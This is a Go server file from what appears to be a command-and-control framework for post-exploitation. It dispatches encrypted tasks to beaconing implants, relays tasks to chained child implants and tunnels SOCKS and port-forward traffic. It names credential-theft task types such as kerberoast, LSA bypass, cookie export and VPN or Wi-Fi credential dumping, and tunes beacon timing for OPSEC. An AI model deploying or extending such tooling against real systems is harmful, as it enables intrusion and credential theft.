package server

import (
	"log/slog"
	"strconv"
	"strings"
	"time"

	"github.com/forgec2/forgec2/internal/db"
	"gorm.io/gorm"
	"gorm.io/gorm/clause"
)

// ── Task fetch / wire encryption / SOCKS ──────────────────────────────────

func (s *Server) fetchPendingTasks(uuid string, limits ...int) []task {
	var claimedTasks []db.Task
	limit := BeaconTaskFetchLimit
	if len(limits) > 0 && limits[0] >= 0 && limits[0] < limit {
		limit = limits[0]
	}
	if limit == 0 {
		return nil
	}

	// Claim and return exactly the same rows. Querying all running tasks after
	// an update can re-dispatch tasks claimed by an earlier beacon.
	// Busy-retried: under fleet bursts the single writer loses the race and
	// a bare failure stalls delivery until the next check-in.
	if err := s.withBusyRetry("claim", func() error {
		return s.db.Transaction(func(tx *gorm.DB) error {
			var pending []db.Task
			if err := tx.Clauses(clause.Locking{Strength: "UPDATE"}).
				// Dispatch columns only. Result/Error blobs (up to MaxResultSize
				// each) are never sent on the wire, so loading them here wastes
				// I/O and fires a pointless AfterFind AES-GCM decrypt per row on
				// every beacon. Command/Data/Shell stay loaded because the wire
				// builder re-encrypts them with the session key below.
				// "offset" is double-quoted: it is a reserved word in
				// PostgreSQL and MySQL-style backticks are a syntax error there.
				Select("id, type, command, shell, path, data, \"offset\", size, prev_mac, mac, task_key").
				Where("agent_id = ? AND status = ?", uuid, "pending").
				Where("NOT (type = ? AND (mac = '' OR mac IS NULL))", "upload").
				Order("priority DESC, created_at ASC").
				Limit(limit).
				Find(&pending).Error; err != nil {
				return err
			}
			if len(pending) > 0 {
				ids := make([]uint, len(pending))
				for i, pendingTask := range pending {
					ids[i] = pendingTask.ID
				}
				result := tx.Model(&db.Task{}).
					Where("id IN ? AND status = ?", ids, "pending").
					Updates(map[string]interface{}{
						"status":     "running",
						"claimed_by": uuid,
						"claimed_at": time.Now(),
					})
				if result.Error != nil {
					return result.Error
				}
				if result.RowsAffected < int64(len(ids)) {
					slog.Debug("Some tasks already claimed by concurrent connection", "agent_id", uuid, "attempted", len(ids), "claimed", result.RowsAffected)
				}
				if err := tx.Select("id, type, command, shell, path, data, \"offset\", size, prev_mac, mac, task_key").Where("id IN ? AND status = ? AND claimed_by = ?", ids, "running", uuid).
					Order("priority DESC, created_at ASC").Limit(len(ids)).Find(&claimedTasks).Error; err != nil {
					return err
				}
			}
			// Lost-response recovery: re-carry running tasks this agent claimed
			// but never acknowledged, oldest first, within the remaining budget.
			// The agent dedupes by task ID, so redelivery never double-executes.
			// No status change here: claimed_at still drives the stale sweeps.
			// The NOT IN guard is load-bearing: without it the rows claimed above
			// (visible in this transaction) would be selected a second time.
			if remaining := limit - len(claimedTasks); remaining > 0 {
				claimedIDs := make([]uint, 0, len(claimedTasks))
				for _, ct := range claimedTasks {
					claimedIDs = append(claimedIDs, ct.ID)
				}
				q := tx.Select("id, type, command, shell, path, data, \"offset\", size, prev_mac, mac, task_key").Where("agent_id = ? AND status = ? AND claimed_by = ? AND acknowledged_at IS NULL", uuid, "running", uuid)
				if len(claimedIDs) > 0 {
					q = q.Where("id NOT IN ?", claimedIDs)
				}
				var unacked []db.Task
				if err := q.Order("claimed_at ASC").Limit(remaining).Find(&unacked).Error; err != nil {
					return err
				}
				claimedTasks = append(claimedTasks, unacked...)
			}
			return nil
		})
	}); err != nil {
		slog.Error("Failed to claim pending tasks", "agent_id", uuid, "error", err)
	}

	// Steady-state (nothing claimed) is Debug; a dispatch that hands work to
	// an implant stays at Info so the operator log shows command delivery.
	if len(claimedTasks) > 0 {
		slog.Info("Beacon fetching pending tasks", "agent_id", uuid, "pending_count", len(claimedTasks))
	} else {
		slog.Debug("Beacon fetching pending tasks", "agent_id", uuid, "pending_count", 0)
	}

	tasks := make([]task, len(claimedTasks))
	for i, t := range claimedTasks {
		wire := task{
			ID:      t.ID,
			Type:    t.Type,
			Command: t.Command,
			Shell:   t.Shell,
			Path:    t.Path,
			Data:    t.Data,
			Offset:  t.Offset,
			Size:    t.Size,
			PrevMAC: t.PrevMAC,
			MAC:     t.MAC,
			Key:     t.TaskKey,
		}
		encryptTaskPayload(s, uuid, &wire)
		tasks[i] = wire
	}
	return tasks
}

// sensitiveTaskTypes are task types whose Command/Data fields can carry
// secrets or code and are therefore encrypted at dispatch time (in addition
// to the transport envelope) with the session key, bound to (agent, task).
// The set extends the at-rest encryption set (db.SensitiveTaskTypes) with
// operator-facing types that stay searchable in the database (shell, ps,
// upload, download_url) but must not travel the wire in clear.
var sensitiveTaskTypes = buildSensitiveTaskTypes()

func buildSensitiveTaskTypes() map[string]bool {
	m := make(map[string]bool, len(db.SensitiveTaskTypes)+4)
	for k := range db.SensitiveTaskTypes {
		m[k] = true
	}
	for _, k := range []string{"shell", "ps", "upload", "download_url",
		"kerberoast", "lsa_bypass", "cookie_export", "vpn_creds", "wifi_creds"} {
		m[k] = true
	}
	return m
}

// encryptTaskPayload encrypts sensitive task Command/Data fields with the
// agent's session key, bound to agentID||taskID. Fields that fail to encrypt
// are delivered in clear (the transport envelope still protects them); the
// session exists on this path, so failures indicate a real problem worth
// logging rather than dropping the task.
func encryptTaskPayload(s *Server, agentID string, wire *task) {
	if !sensitiveTaskTypes[wire.Type] || s.sessionManager == nil {
		return
	}
	aad := []byte(agentID + "\x00" + strconv.FormatUint(uint64(wire.ID), 10))
	encrypted := false
	if wire.Command != "" {
		if ct, err := s.sessionManager.EncryptB64WithAAD(agentID, []byte(wire.Command), aad); err == nil {
			wire.Command = ct
			encrypted = true
		} else {
			slog.Error("Task command encryption failed", "agent_id", agentID, "task_id", wire.ID, "error", err)
		}
	}
	if wire.Data != "" {
		if ct, err := s.sessionManager.EncryptB64WithAAD(agentID, []byte(wire.Data), aad); err == nil {
			wire.Data = ct
			encrypted = true
		} else {
			slog.Error("Task data encryption failed", "agent_id", agentID, "task_id", wire.ID, "error", err)
		}
	}
	// Shell is encrypted for any wire-sensitive task that carries a Shell value
	// (token_make password and shell interpreter such as cmd.exe / powershell).
	// The agent decrypts Command and Shell together when Encrypted is set;
	// leaving Shell in clear for shell tasks caused "task payload decryption
	// failed" on the implant side.
	if wire.Shell != "" && (db.SensitiveShellTypes[wire.Type] || wire.Type == "shell") {
		if ct, err := s.sessionManager.EncryptB64WithAAD(agentID, []byte(wire.Shell), aad); err == nil {
			wire.Shell = ct
			encrypted = true
		} else {
			slog.Error("Task shell encryption failed", "agent_id", agentID, "task_id", wire.ID, "error", err)
		}
	}
	wire.Encrypted = encrypted
}

func (s *Server) fetchRelayedChildTasks(parentUUID string) []relayedTask {
	var children []db.Implant
	if err := s.db.Where("parent_id = ?", parentUUID).Limit(500).Find(&children).Error; err != nil {
		slog.Error("Failed to fetch child agents", "parent", parentUUID, "error", err)
	}
	if len(children) == 0 {
		return nil
	}

	childIDs := make([]string, 0, len(children))
	for _, c := range children {
		childIDs = append(childIDs, c.ID)
	}

	var claimedTasks []db.Task
	if err := s.withBusyRetry("claim", func() error {
		return s.db.Transaction(func(tx *gorm.DB) error {
			var pending []db.Task
			if err := tx.Clauses(clause.Locking{Strength: "UPDATE"}).
				Where("agent_id IN ? AND status = ?", childIDs, "pending").
				Where("NOT (type = ? AND (mac = '' OR mac IS NULL))", "upload").
				Order("priority DESC, created_at ASC").
				Limit(BeaconTaskFetchLimit).
				Find(&pending).Error; err != nil {
				return err
			}
			if len(pending) > 0 {
				ids := make([]uint, len(pending))
				for i, pendingTask := range pending {
					ids[i] = pendingTask.ID
				}
				if result := tx.Model(&db.Task{}).Where("id IN ? AND status = ?", ids, "pending").Updates(map[string]interface{}{
					"status": "running", "claimed_by": parentUUID, "claimed_at": time.Now(),
				}); result.Error != nil {
					return result.Error
				}
				// Same claimed_by filter as fetchPendingTasks: SQLite silently drops
				// FOR UPDATE row locks, so selecting all ids after the update could
				// re-dispatch tasks another concurrent parent beacon had already won.
				if err := tx.Where("id IN ? AND status = ? AND claimed_by = ?", ids, "running", parentUUID).
					Order("priority DESC, created_at ASC").Limit(len(ids)).Find(&claimedTasks).Error; err != nil {
					return err
				}
			}
			// Lost-response recovery for relayed children, mirroring
			// fetchPendingTasks (agent dedupes by task ID). NOT IN guard excludes
			// the rows claimed above within this transaction.
			if remaining := BeaconTaskFetchLimit - len(claimedTasks); remaining > 0 {
				claimedIDs := make([]uint, 0, len(claimedTasks))
				for _, ct := range claimedTasks {
					claimedIDs = append(claimedIDs, ct.ID)
				}
				q := tx.Where("agent_id IN ? AND status = ? AND claimed_by = ? AND acknowledged_at IS NULL", childIDs, "running", parentUUID)
				if len(claimedIDs) > 0 {
					q = q.Where("id NOT IN ?", claimedIDs)
				}
				var unacked []db.Task
				if err := q.Order("claimed_at ASC").Limit(remaining).Find(&unacked).Error; err != nil {
					return err
				}
				claimedTasks = append(claimedTasks, unacked...)
			}
			return nil
		})
	}); err != nil {
		slog.Error("Failed to batch claim child tasks", "parent", parentUUID, "error", err)
		return nil
	}

	// Group by agent_id
	tasksByAgent := make(map[string][]db.Task, len(childIDs))
	for _, t := range claimedTasks {
		agentID := strings.ToLower(t.AgentID)
		tasksByAgent[agentID] = append(tasksByAgent[agentID], t)
	}

	var relayed []relayedTask
	for _, child := range children {
		tasks := tasksByAgent[strings.ToLower(child.ID)]
		if len(tasks) == 0 {
			continue
		}
		rt := relayedTask{AgentID: child.ID}
		for _, t := range tasks {
			wire := task{
				ID:      t.ID,
				Type:    t.Type,
				Command: t.Command,
				Shell:   t.Shell,
				Path:    t.Path,
				Data:    t.Data,
				Offset:  t.Offset,
				Size:    t.Size,
				PrevMAC: t.PrevMAC,
				MAC:     t.MAC,
				Key:     t.TaskKey,
			}
			// Child tasks travel inside the parent's response, so their
			// sensitive fields are encrypted with the CHILD's session key.
			if s.sessionManager != nil && s.sessionManager.HasSession(child.ID) {
				encryptTaskPayload(s, child.ID, &wire)
			}
			rt.Tasks = append(rt.Tasks, wire)
		}
		relayed = append(relayed, rt)
	}
	return relayed
}

func (s *Server) processSOCKSRelay(uuid string, socksData []socksFrame, resp *beaconResponse) {
	s.processSOCKSRelayWithBudget(uuid, socksData, resp, 0, 0)
}

// processSOCKSRelayWithBudget is processSOCKSRelay with a tunnel frame
// budget for datagram transports (frameSize/budget<=0 drains everything).
func (s *Server) processSOCKSRelayWithBudget(uuid string, socksData []socksFrame, resp *beaconResponse, frameSize, budget int) {
	// Process relay data coming FROM the agent (includes rportfwd frames)
	if len(socksData) > 0 {
		s.processAgentSocksData(uuid, socksData)
		// Handle rportfwd response frames from agent
		for _, f := range socksData {
			if strings.HasPrefix(f.Action, "rportfwd_") {
				s.processRPortFwdData(uuid, f)
			}
			if strings.HasPrefix(f.Action, "lportfwd_") {
				s.processLPortFwdData(uuid, f)
			}
		}
	}
	// Collect pending relay frames going TO the agent
	if frames := s.collectSocksFrames(uuid, frameSize, budget); len(frames) > 0 {
		resp.SocksFrames = frames
	}
	// Fast-poll hint only while traffic flows in either direction: an idle
	// but open session used to pin the agent at 500ms beacons indefinitely
	// (OPSEC burn with zero benefit). Frames in this response re-arm fast
	// mode agent-side on their own; inbound frames mean the operator leg is
	// live. A newly opened operator connection waits for the next normal
	// beacon — use beacon_now for interactive setup.
	if len(resp.SocksFrames) > 0 || len(socksData) > 0 {
		resp.SocksFastMode = true
	}
}
